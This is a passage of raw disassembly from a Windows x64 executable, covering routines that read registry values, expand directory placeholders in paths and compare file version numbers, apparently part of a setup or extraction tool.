   140002579:	ba fa 04 00 00       	mov    $0x4fa,%edx
   14000257e:	33 c9                	xor    %ecx,%ecx
   140002580:	e8 a7 29 00 00       	call   0x140004f2c
   140002585:	e9 98 00 00 00       	jmp    0x140002622
   14000258a:	83 f9 04             	cmp    $0x4,%ecx
   14000258d:	75 44                	jne    0x1400025d3
   14000258f:	45 8d 0c 10          	lea    (%r8,%rdx,1),%r9d
   140002593:	8d 51 06             	lea    0x6(%rcx),%edx
   140002596:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000259b:	4c 8d 05 a2 72 00 00 	lea    0x72a2(%rip),%r8        # 0x140009844
   1400025a2:	e8 15 eb ff ff       	call   0x1400010bc
   1400025a7:	45 33 c9             	xor    %r9d,%r9d
   1400025aa:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   1400025b1:	00 
   1400025b2:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1400025b7:	c7 44 24 20 20 00 00 	movl   $0x20,0x20(%rsp)
   1400025be:	00 
   1400025bf:	ba bd 04 00 00       	mov    $0x4bd,%edx
   1400025c4:	33 c9                	xor    %ecx,%ecx
   1400025c6:	e8 61 29 00 00       	call   0x140004f2c
   1400025cb:	83 f8 04             	cmp    $0x4,%eax
   1400025ce:	0f 94 c3             	sete   %bl
   1400025d1:	eb 4f                	jmp    0x140002622
   1400025d3:	83 f9 02             	cmp    $0x2,%ecx
   1400025d6:	75 4a                	jne    0x140002622
   1400025d8:	45 8b c8             	mov    %r8d,%r9d
   1400025db:	8d 51 08             	lea    0x8(%rcx),%edx
   1400025de:	4c 8d 05 5f 72 00 00 	lea    0x725f(%rip),%r8        # 0x140009844
   1400025e5:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400025ea:	e8 cd ea ff ff       	call   0x1400010bc
   1400025ef:	4c 8b cf             	mov    %rdi,%r9
   1400025f2:	c7 44 24 28 04 01 00 	movl   $0x104,0x28(%rsp)
   1400025f9:	00 
   1400025fa:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1400025ff:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   140002606:	00 
   140002607:	ba cc 04 00 00       	mov    $0x4cc,%edx
   14000260c:	33 c9                	xor    %ecx,%ecx
   14000260e:	e8 19 29 00 00       	call   0x140004f2c
   140002613:	83 f8 06             	cmp    $0x6,%eax
   140002616:	75 0a                	jne    0x140002622
   140002618:	83 25 25 af 00 00 00 	andl   $0x0,0xaf25(%rip)        # 0x14000d544
   14000261f:	8d 58 fb             	lea    -0x5(%rax),%ebx
   140002622:	8b c3                	mov    %ebx,%eax
   140002624:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140002629:	48 33 cc             	xor    %rsp,%rcx
   14000262c:	e8 bf 60 00 00       	call   0x1400086f0
   140002631:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140002636:	48 83 c4 50          	add    $0x50,%rsp
   14000263a:	5f                   	pop    %rdi
   14000263b:	c3                   	ret
   14000263c:	cc                   	int3
   14000263d:	cc                   	int3
   14000263e:	cc                   	int3
   14000263f:	cc                   	int3
   140002640:	cc                   	int3
   140002641:	cc                   	int3
   140002642:	cc                   	int3
   140002643:	cc                   	int3
   140002644:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002649:	55                   	push   %rbp
   14000264a:	56                   	push   %rsi
   14000264b:	57                   	push   %rdi
   14000264c:	41 54                	push   %r12
   14000264e:	41 56                	push   %r14
   140002650:	48 8d 6c 24 a0       	lea    -0x60(%rsp),%rbp
   140002655:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
   14000265c:	48 8b 05 a5 99 00 00 	mov    0x99a5(%rip),%rax        # 0x14000c008
   140002663:	48 33 c4             	xor    %rsp,%rax
   140002666:	48 89 45 50          	mov    %rax,0x50(%rbp)
   14000266a:	33 f6                	xor    %esi,%esi
   14000266c:	49 8b f8             	mov    %r8,%rdi
   14000266f:	40 88 31             	mov    %sil,(%rcx)
   140002672:	48 8b d9             	mov    %rcx,%rbx
   140002675:	41 80 38 23          	cmpb   $0x23,(%r8)
   140002679:	44 8d 66 01          	lea    0x1(%rsi),%r12d
   14000267d:	0f 85 c6 01 00 00    	jne    0x140002849
   140002683:	49 03 fc             	add    %r12,%rdi
   140002686:	48 0f be 0f          	movsbq (%rdi),%rcx
   14000268a:	48 ff 15 ef 6e 00 00 	rex.W call *0x6eef(%rip)        # 0x140009580
   140002691:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002696:	48 8b cf             	mov    %rdi,%rcx
   140002699:	4c 8b f0             	mov    %rax,%r14
   14000269c:	48 ff 15 a5 6e 00 00 	rex.W call *0x6ea5(%rip)        # 0x140009548
   1400026a3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400026a8:	48 8b c8             	mov    %rax,%rcx
   1400026ab:	48 ff 15 96 6e 00 00 	rex.W call *0x6e96(%rip)        # 0x140009548
   1400026b2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400026b7:	48 8b f8             	mov    %rax,%rdi
   1400026ba:	41 80 fe 53          	cmp    $0x53,%r14b
   1400026be:	0f 84 6b 01 00 00    	je     0x14000282f
   1400026c4:	41 80 fe 57          	cmp    $0x57,%r14b
   1400026c8:	0f 84 4b 01 00 00    	je     0x140002819
   1400026ce:	4c 8d 05 73 71 00 00 	lea    0x7173(%rip),%r8        # 0x140009848
   1400026d5:	c7 44 24 34 04 01 00 	movl   $0x104,0x34(%rsp)
   1400026dc:	00 
   1400026dd:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   1400026e2:	ba 04 01 00 00       	mov    $0x104,%edx
   1400026e7:	4c 2b c0             	sub    %rax,%r8
   1400026ea:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400026ef:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   1400026f6:	48 85 c0             	test   %rax,%rax
   1400026f9:	74 12                	je     0x14000270d
   1400026fb:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   1400026ff:	84 c0                	test   %al,%al
   140002701:	74 0a                	je     0x14000270d
   140002703:	88 01                	mov    %al,(%rcx)
   140002705:	49 03 cc             	add    %r12,%rcx
   140002708:	49 2b d4             	sub    %r12,%rdx
   14000270b:	75 e2                	jne    0x1400026ef
   14000270d:	48 85 d2             	test   %rdx,%rdx
   140002710:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140002714:	4c 8b c7             	mov    %rdi,%r8
   140002717:	ba 04 01 00 00       	mov    $0x104,%edx
   14000271c:	48 0f 45 c1          	cmovne %rcx,%rax
   140002720:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002725:	40 88 30             	mov    %sil,(%rax)
   140002728:	e8 db 56 00 00       	call   0x140007e08
   14000272d:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140002732:	41 b9 19 00 02 00    	mov    $0x20019,%r9d
   140002738:	45 33 c0             	xor    %r8d,%r8d
   14000273b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002740:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140002745:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   14000274c:	48 ff 15 05 6a 00 00 	rex.W call *0x6a05(%rip)        # 0x140009158
   140002753:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002758:	85 c0                	test   %eax,%eax
   14000275a:	0f 85 fa 00 00 00    	jne    0x14000285a
   140002760:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140002765:	48 8d 44 24 34       	lea    0x34(%rsp),%rax
   14000276a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000276f:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140002774:	45 33 c0             	xor    %r8d,%r8d
   140002777:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000277c:	48 8d 15 dd 6f 00 00 	lea    0x6fdd(%rip),%rdx        # 0x140009760
   140002783:	48 ff 15 0e 6a 00 00 	rex.W call *0x6a0e(%rip)        # 0x140009198
   14000278a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000278f:	85 c0                	test   %eax,%eax
   140002791:	75 73                	jne    0x140002806
   140002793:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140002797:	83 f8 02             	cmp    $0x2,%eax
   14000279a:	75 63                	jne    0x1400027ff
   14000279c:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1400027a2:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1400027a7:	48 8b cb             	mov    %rbx,%rcx
   1400027aa:	48 ff 15 2f 6c 00 00 	rex.W call *0x6c2f(%rip)        # 0x1400093e0
   1400027b1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400027b6:	85 c0                	test   %eax,%eax
   1400027b8:	74 41                	je     0x1400027fb
   1400027ba:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   1400027bf:	ba 04 01 00 00       	mov    $0x104,%edx
   1400027c4:	4c 2b c3             	sub    %rbx,%r8
   1400027c7:	48 8b cb             	mov    %rbx,%rcx
   1400027ca:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   1400027d1:	48 85 c0             	test   %rax,%rax
   1400027d4:	74 12                	je     0x1400027e8
   1400027d6:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   1400027da:	84 c0                	test   %al,%al
   1400027dc:	74 0a                	je     0x1400027e8
   1400027de:	88 01                	mov    %al,(%rcx)
   1400027e0:	49 03 cc             	add    %r12,%rcx
   1400027e3:	49 2b d4             	sub    %r12,%rdx
   1400027e6:	75 e2                	jne    0x1400027ca
   1400027e8:	48 85 d2             	test   %rdx,%rdx
   1400027eb:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   1400027ef:	48 0f 45 c1          	cmovne %rcx,%rax
   1400027f3:	40 88 30             	mov    %sil,(%rax)
   1400027f6:	41 8b f4             	mov    %r12d,%esi
   1400027f9:	eb 0b                	jmp    0x140002806
   1400027fb:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1400027ff:	41 3b c4             	cmp    %r12d,%eax
   140002802:	41 0f 44 f4          	cmove  %r12d,%esi
   140002806:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000280b:	48 ff 15 96 69 00 00 	rex.W call *0x6996(%rip)        # 0x1400091a8
   140002812:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002817:	eb 2a                	jmp    0x140002843
   140002819:	ba 04 01 00 00       	mov    $0x104,%edx
   14000281e:	48 8b cb             	mov    %rbx,%rcx
   140002821:	48 ff 15 48 6a 00 00 	rex.W call *0x6a48(%rip)        # 0x140009270
   140002828:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000282d:	eb 2b                	jmp    0x14000285a
   14000282f:	ba 04 01 00 00       	mov    $0x104,%edx
   140002834:	48 8b cb             	mov    %rbx,%rcx
   140002837:	48 ff 15 f2 69 00 00 	rex.W call *0x69f2(%rip)        # 0x140009230
   14000283e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002843:	85 f6                	test   %esi,%esi
   140002845:	75 23                	jne    0x14000286a
   140002847:	eb 11                	jmp    0x14000285a
   140002849:	ba 04 01 00 00       	mov    $0x104,%edx
   14000284e:	48 ff 15 db 69 00 00 	rex.W call *0x69db(%rip)        # 0x140009230
   140002855:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000285a:	4c 8b c7             	mov    %rdi,%r8
   14000285d:	ba 04 01 00 00       	mov    $0x104,%edx
   140002862:	48 8b cb             	mov    %rbx,%rcx
   140002865:	e8 9e 55 00 00       	call   0x140007e08
   14000286a:	41 8b c4             	mov    %r12d,%eax
   14000286d:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140002871:	48 33 cc             	xor    %rsp,%rcx
   140002874:	e8 77 5e 00 00       	call   0x1400086f0
   140002879:	48 8b 9c 24 98 01 00 	mov    0x198(%rsp),%rbx
   140002880:	00 
   140002881:	48 81 c4 60 01 00 00 	add    $0x160,%rsp
   140002888:	41 5e                	pop    %r14
   14000288a:	41 5c                	pop    %r12
   14000288c:	5f                   	pop    %rdi
   14000288d:	5e                   	pop    %rsi
   14000288e:	5d                   	pop    %rbp
   14000288f:	c3                   	ret
   140002890:	cc                   	int3
   140002891:	cc                   	int3
   140002892:	cc                   	int3
   140002893:	cc                   	int3
   140002894:	cc                   	int3
   140002895:	cc                   	int3
   140002896:	cc                   	int3
   140002897:	cc                   	int3
   140002898:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   14000289d:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400028a2:	55                   	push   %rbp
   1400028a3:	53                   	push   %rbx
   1400028a4:	56                   	push   %rsi
   1400028a5:	57                   	push   %rdi
   1400028a6:	41 54                	push   %r12
   1400028a8:	41 55                	push   %r13
   1400028aa:	41 56                	push   %r14
   1400028ac:	41 57                	push   %r15
   1400028ae:	48 8b ec             	mov    %rsp,%rbp
   1400028b1:	48 83 ec 48          	sub    $0x48,%rsp
   1400028b5:	45 33 ff             	xor    %r15d,%r15d
   1400028b8:	4d 8b e1             	mov    %r9,%r12
   1400028bb:	4c 8b f2             	mov    %rdx,%r14
   1400028be:	4c 8b e9             	mov    %rcx,%r13
   1400028c1:	41 8b ff             	mov    %r15d,%edi
   1400028c4:	44 89 7d 58          	mov    %r15d,0x58(%rbp)
   1400028c8:	41 8b df             	mov    %r15d,%ebx
   1400028cb:	44 39 79 7c          	cmp    %r15d,0x7c(%rcx)
   1400028cf:	0f 8e c5 01 00 00    	jle    0x140002a9a
   1400028d5:	41 8b c7             	mov    %r15d,%eax
   1400028d8:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1400028dc:	41 8b b5 80 00 00 00 	mov    0x80(%r13),%esi
   1400028e3:	4d 8d 85 84 00 00 00 	lea    0x84(%r13),%r8
   1400028ea:	48 03 f0             	add    %rax,%rsi
   1400028ed:	49 8b ce             	mov    %r14,%rcx
   1400028f0:	42 8b 84 2e bc 00 00 	mov    0xbc(%rsi,%r13,1),%eax
   1400028f7:	00 
   1400028f8:	4c 03 c0             	add    %rax,%r8
   1400028fb:	e8 44 fd ff ff       	call   0x140002644
   140002900:	85 c0                	test   %eax,%eax
   140002902:	0f 84 ab 01 00 00    	je     0x140002ab3
   140002908:	48 8d 55 48          	lea    0x48(%rbp),%rdx
   14000290c:	49 8b ce             	mov    %r14,%rcx
   14000290f:	48 ff 15 9a 6c 00 00 	rex.W call *0x6c9a(%rip)        # 0x1400095b0
   140002916:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000291b:	44 8b f0             	mov    %eax,%r14d
   14000291e:	85 c0                	test   %eax,%eax
   140002920:	0f 84 44 01 00 00    	je     0x140002a6a
   140002926:	41 8b d6             	mov    %r14d,%edx
   140002929:	b9 42 00 00 00       	mov    $0x42,%ecx
   14000292e:	48 ff 15 13 69 00 00 	rex.W call *0x6913(%rip)        # 0x140009248
   140002935:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000293a:	48 8b f8             	mov    %rax,%rdi
   14000293d:	48 85 c0             	test   %rax,%rax
   140002940:	0f 84 64 01 00 00    	je     0x140002aaa
   140002946:	48 8b c8             	mov    %rax,%rcx
   140002949:	48 ff 15 38 69 00 00 	rex.W call *0x6938(%rip)        # 0x140009288
   140002950:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002955:	4c 8b f8             	mov    %rax,%r15
   140002958:	48 85 c0             	test   %rax,%rax
   14000295b:	0f 84 40 01 00 00    	je     0x140002aa1
   140002961:	8b 55 48             	mov    0x48(%rbp),%edx
   140002964:	45 8b c6             	mov    %r14d,%r8d
   140002967:	4c 8b 75 50          	mov    0x50(%rbp),%r14
   14000296b:	4c 8b c8             	mov    %rax,%r9
   14000296e:	49 8b ce             	mov    %r14,%rcx
   140002971:	48 ff 15 40 6c 00 00 	rex.W call *0x6c40(%rip)        # 0x1400095b8
   140002978:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000297d:	85 c0                	test   %eax,%eax
   14000297f:	0f 84 d1 00 00 00    	je     0x140002a56
   140002985:	4c 8d 4d 60          	lea    0x60(%rbp),%r9
   140002989:	49 8b cf             	mov    %r15,%rcx
   14000298c:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   140002990:	48 8d 15 e5 6e 00 00 	lea    0x6ee5(%rip),%rdx        # 0x14000987c
   140002997:	48 ff 15 0a 6c 00 00 	rex.W call *0x6c0a(%rip)        # 0x1400095a8
   14000299e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400029a3:	45 33 ff             	xor    %r15d,%r15d
   1400029a6:	85 c0                	test   %eax,%eax
   1400029a8:	0f 84 ab 00 00 00    	je     0x140002a59
   1400029ae:	44 39 7d 60          	cmp    %r15d,0x60(%rbp)
   1400029b2:	0f 84 a1 00 00 00    	je     0x140002a59
   1400029b8:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400029bc:	49 8d 8d 90 00 00 00 	lea    0x90(%r13),%rcx
   1400029c3:	48 03 ce             	add    %rsi,%rcx
   1400029c6:	41 8b d7             	mov    %r15d,%edx
   1400029c9:	44 8b 48 0c          	mov    0xc(%rax),%r9d
   1400029cd:	44 8b 40 08          	mov    0x8(%rax),%r8d
   1400029d1:	44 3b 41 f4          	cmp    -0xc(%rcx),%r8d
   1400029d5:	73 05                	jae    0x1400029dc
   1400029d7:	83 c8 ff             	or     $0xffffffff,%eax
   1400029da:	eb 15                	jmp    0x1400029f1
   1400029dc:	76 07                	jbe    0x1400029e5
   1400029de:	b8 01 00 00 00       	mov    $0x1,%eax
   1400029e3:	eb 0c                	jmp    0x1400029f1
   1400029e5:	44 3b 49 f8          	cmp    -0x8(%rcx),%r9d
   1400029e9:	72 ec                	jb     0x1400029d7
   1400029eb:	41 8b c7             	mov    %r15d,%eax
   1400029ee:	0f 97 c0             	seta   %al
   1400029f1:	89 44 15 d8          	mov    %eax,-0x28(%rbp,%rdx,1)
   1400029f5:	44 3b 01             	cmp    (%rcx),%r8d
   1400029f8:	73 05                	jae    0x1400029ff
   1400029fa:	83 c8 ff             	or     $0xffffffff,%eax
   1400029fd:	eb 15                	jmp    0x140002a14
   1400029ff:	76 07                	jbe    0x140002a08
   140002a01:	b8 01 00 00 00       	mov    $0x1,%eax
   140002a06:	eb 0c                	jmp    0x140002a14
   140002a08:	44 3b 49 04          	cmp    0x4(%rcx),%r9d
   140002a0c:	72 ec                	jb     0x1400029fa
   140002a0e:	41 8b c7             	mov    %r15d,%eax
   140002a11:	0f 97 c0             	seta   %al
   140002a14:	89 44 15 e0          	mov    %eax,-0x20(%rbp,%rdx,1)
   140002a18:	48 83 c1 18          	add    $0x18,%rcx
   140002a1c:	48 83 c2 04          	add    $0x4,%rdx
   140002a20:	48 83 fa 08          	cmp    $0x8,%rdx
   140002a24:	7c ab                	jl     0x1400029d1
   140002a26:	44 39 7d d8          	cmp    %r15d,-0x28(%rbp)
   140002a2a:	7c 06                	jl     0x140002a32
   140002a2c:	44 39 7d e0          	cmp    %r15d,-0x20(%rbp)
   140002a30:	7e 27                	jle    0x140002a59
   140002a32:	44 39 7d dc          	cmp    %r15d,-0x24(%rbp)
   140002a36:	7c 06                	jl     0x140002a3e
   140002a38:	44 39 7d e4          	cmp    %r15d,-0x1c(%rbp)
   140002a3c:	7e 1b                	jle    0x140002a59
   140002a3e:	48 8b cf             	mov    %rdi,%rcx
   140002a41:	48 ff 15 80 68 00 00 	rex.W call *0x6880(%rip)        # 0x1400092c8
   140002a48:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002a4d:	41 89 1c 24          	mov    %ebx,(%r12)
   140002a51:	41 8b f7             	mov    %r15d,%esi
   140002a54:	eb 69                	jmp    0x140002abf
   140002a56:	45 33 ff             	xor    %r15d,%r15d
   140002a59:	48 8b cf             	mov    %rdi,%rcx
   140002a5c:	48 ff 15 65 68 00 00 	rex.W call *0x6865(%rip)        # 0x1400092c8
   140002a63:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002a68:	eb 18                	jmp    0x140002a82
   140002a6a:	46 39 bc 2e 84 00 00 	cmp    %r15d,0x84(%rsi,%r13,1)
   140002a71:	00 
   140002a72:	75 3f                	jne    0x140002ab3
   140002a74:	46 39 bc 2e 88 00 00 	cmp    %r15d,0x88(%rsi,%r13,1)
   140002a7b:	00 
   140002a7c:	75 35                	jne    0x140002ab3
   140002a7e:	4c 8b 75 50          	mov    0x50(%rbp),%r14
   140002a82:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140002a86:	ff c3                	inc    %ebx
   140002a88:	48 83 c0 3c          	add    $0x3c,%rax
   140002a8c:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140002a90:	41 3b 5d 7c          	cmp    0x7c(%r13),%ebx
   140002a94:	0f 8c 42 fe ff ff    	jl     0x1400028dc
   140002a9a:	be 01 00 00 00       	mov    $0x1,%esi
   140002a9f:	eb 15                	jmp    0x140002ab6
   140002aa1:	8b 75 58             	mov    0x58(%rbp),%esi
   140002aa4:	41 89 1c 24          	mov    %ebx,(%r12)
   140002aa8:	eb 15                	jmp    0x140002abf
   140002aaa:	8b 75 58             	mov    0x58(%rbp),%esi
   140002aad:	41 89 1c 24          	mov    %ebx,(%r12)
   140002ab1:	eb 1b                	jmp    0x140002ace
   140002ab3:	8b 75 58             	mov    0x58(%rbp),%esi
   140002ab6:	41 89 1c 24          	mov    %ebx,(%r12)
   140002aba:	48 85 ff             	test   %rdi,%rdi
   140002abd:	74 0f                	je     0x140002ace
   140002abf:	48 8b cf             	mov    %rdi,%rcx
   140002ac2:	48 ff 15 87 67 00 00 	rex.W call *0x6787(%rip)        # 0x140009250
   140002ac9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002ace:	8b c6                	mov    %esi,%eax
   140002ad0:	48 83 c4 48          	add    $0x48,%rsp
   140002ad4:	41 5f                	pop    %r15
   140002ad6:	41 5e                	pop    %r14
   140002ad8:	41 5d                	pop    %r13
   140002ada:	41 5c                	pop    %r12
   140002adc:	5f                   	pop    %rdi
   140002add:	5e                   	pop    %rsi
   140002ade:	5b                   	pop    %rbx
   140002adf:	5d                   	pop    %rbp
   140002ae0:	c3                   	ret
   140002ae1:	cc                   	int3
   140002ae2:	cc                   	int3
   140002ae3:	cc                   	int3
   140002ae4:	cc                   	int3
   140002ae5:	cc                   	int3
   140002ae6:	cc                   	int3
   140002ae7:	cc                   	int3
   140002ae8:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002aed:	56                   	push   %rsi
   140002aee:	57                   	push   %rdi
   140002aef:	41 56                	push   %r14
   140002af1:	48 81 ec 40 01 00 00 	sub    $0x140,%rsp
   140002af8:	48 8b 05 09 95 00 00 	mov    0x9509(%rip),%rax        # 0x14000c008
   140002aff:	48 33 c4             	xor    %rsp,%rax
   140002b02:	48 89 84 24 30 01 00 	mov    %rax,0x130(%rsp)
   140002b09:	00 
   140002b0a:	c6 02 00             	movb   $0x0,(%rdx)
   140002b0d:	48 8b f2             	mov    %rdx,%rsi
   140002b10:	48 8b f9             	mov    %rcx,%rdi
   140002b13:	48 8b da             	mov    %rdx,%rbx
   140002b16:	48 85 c9             	test   %rcx,%rcx
   140002b19:	0f 84 25 02 00 00    	je     0x140002d44
   140002b1f:	80 39 00             	cmpb   $0x0,(%rcx)
   140002b22:	0f 84 1c 02 00 00    	je     0x140002d44
   140002b28:	48 8b 0d 41 b3 00 00 	mov    0xb341(%rip),%rcx        # 0x14000de70
   140002b2f:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002b34:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140002b3a:	48 ff 15 cf 68 00 00 	rex.W call *0x68cf(%rip)        # 0x140009410
   140002b41:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002b46:	8a 07                	mov    (%rdi),%al
   140002b48:	84 c0                	test   %al,%al
   140002b4a:	0f 84 f1 01 00 00    	je     0x140002d41
   140002b50:	49 83 ce ff          	or     $0xffffffffffffffff,%r14
   140002b54:	8a c8                	mov    %al,%cl
   140002b56:	48 ff 15 0b 67 00 00 	rex.W call *0x670b(%rip)        # 0x140009268
   140002b5d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002b62:	8a 17                	mov    (%rdi),%dl
   140002b64:	88 13                	mov    %dl,(%rbx)
   140002b66:	85 c0                	test   %eax,%eax
   140002b68:	74 06                	je     0x140002b70
   140002b6a:	8a 47 01             	mov    0x1(%rdi),%al
   140002b6d:	88 43 01             	mov    %al,0x1(%rbx)
   140002b70:	80 3f 23             	cmpb   $0x23,(%rdi)
   140002b73:	0f 85 9a 01 00 00    	jne    0x140002d13
   140002b79:	48 8b cf             	mov    %rdi,%rcx
   140002b7c:	48 ff 15 c5 69 00 00 	rex.W call *0x69c5(%rip)        # 0x140009548
   140002b83:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002b88:	48 8b f8             	mov    %rax,%rdi
   140002b8b:	48 0f be 08          	movsbq (%rax),%rcx
   140002b8f:	48 ff 15 ea 69 00 00 	rex.W call *0x69ea(%rip)        # 0x140009580
   140002b96:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002b9b:	3c 44                	cmp    $0x44,%al
   140002b9d:	0f 85 ca 00 00 00    	jne    0x140002c6d
   140002ba3:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002ba8:	e8 f3 52 00 00       	call   0x140007ea0
   140002bad:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002bb2:	49 8b c6             	mov    %r14,%rax
   140002bb5:	48 ff c0             	inc    %rax
   140002bb8:	80 3c 01 00          	cmpb   $0x0,(%rcx,%rax,1)
   140002bbc:	75 f7                	jne    0x140002bb5
   140002bbe:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002bc3:	48 03 d0             	add    %rax,%rdx
   140002bc6:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002bcb:	48 ff 15 86 69 00 00 	rex.W call *0x6986(%rip)        # 0x140009558
   140002bd2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002bd7:	48 85 c0             	test   %rax,%rax
   140002bda:	74 08                	je     0x140002be4
   140002bdc:	80 38 5c             	cmpb   $0x5c,(%rax)
   140002bdf:	75 03                	jne    0x140002be4
   140002be1:	c6 00 00             	movb   $0x0,(%rax)
   140002be4:	48 3b de             	cmp    %rsi,%rbx
   140002be7:	72 69                	jb     0x140002c52
   140002be9:	48 8b c3             	mov    %rbx,%rax
   140002bec:	48 2b c6             	sub    %rsi,%rax
   140002bef:	48 3d 00 04 00 00    	cmp    $0x400,%rax
   140002bf5:	77 5b                	ja     0x140002c52
   140002bf7:	48 8b ce             	mov    %rsi,%rcx
   140002bfa:	48 2b cb             	sub    %rbx,%rcx
   140002bfd:	48 81 c1 00 04 00 00 	add    $0x400,%rcx
   140002c04:	48 8b c1             	mov    %rcx,%rax
   140002c07:	74 4b                	je     0x140002c54
   140002c09:	48 81 f9 ff ff ff 7f 	cmp    $0x7fffffff,%rcx
   140002c10:	77 42                	ja     0x140002c54
   140002c12:	41 b8 fe ff ff 7f    	mov    $0x7ffffffe,%r8d
   140002c18:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   140002c1d:	4c 2b c1             	sub    %rcx,%r8
   140002c20:	48 8b d3             	mov    %rbx,%rdx
   140002c23:	4c 2b cb             	sub    %rbx,%r9
   140002c26:	49 8d 04 08          	lea    (%r8,%rcx,1),%rax
   140002c2a:	48 85 c0             	test   %rax,%rax
   140002c2d:	74 13                	je     0x140002c42
   140002c2f:	41 8a 04 11          	mov    (%r9,%rdx,1),%al
   140002c33:	84 c0                	test   %al,%al
   140002c35:	74 0b                	je     0x140002c42
   140002c37:	88 02                	mov    %al,(%rdx)
   140002c39:	48 ff c2             	inc    %rdx
   140002c3c:	48 83 e9 01          	sub    $0x1,%rcx
   140002c40:	75 e4                	jne    0x140002c26
   140002c42:	48 85 c9             	test   %rcx,%rcx
   140002c45:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   140002c49:	48 0f 45 c2          	cmovne %rdx,%rax
   140002c4d:	c6 00 00             	movb   $0x0,(%rax)
   140002c50:	eb 0a                	jmp    0x140002c5c
   140002c52:	33 c0                	xor    %eax,%eax
   140002c54:	48 85 c0             	test   %rax,%rax
   140002c57:	74 03                	je     0x140002c5c
   140002c59:	c6 03 00             	movb   $0x0,(%rbx)
   140002c5c:	49 8b c6             	mov    %r14,%rax
   140002c5f:	48 ff c0             	inc    %rax
   140002c62:	80 3c 03 00          	cmpb   $0x0,(%rbx,%rax,1)
   140002c66:	75 f7                	jne    0x140002c5f
   140002c68:	e9 9c 00 00 00       	jmp    0x140002d09
   140002c6d:	48 0f be 0f          	movsbq (%rdi),%rcx
   140002c71:	48 ff 15 08 69 00 00 	rex.W call *0x6908(%rip)        # 0x140009580
   140002c78:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002c7d:	3c 45                	cmp    $0x45,%al
   140002c7f:	0f 85 89 00 00 00    	jne    0x140002d0e
   140002c85:	48 3b de             	cmp    %rsi,%rbx
   140002c88:	72 69                	jb     0x140002cf3
   140002c8a:	48 8b c3             	mov    %rbx,%rax
   140002c8d:	48 2b c6             	sub    %rsi,%rax
   140002c90:	48 3d 00 04 00 00    	cmp    $0x400,%rax
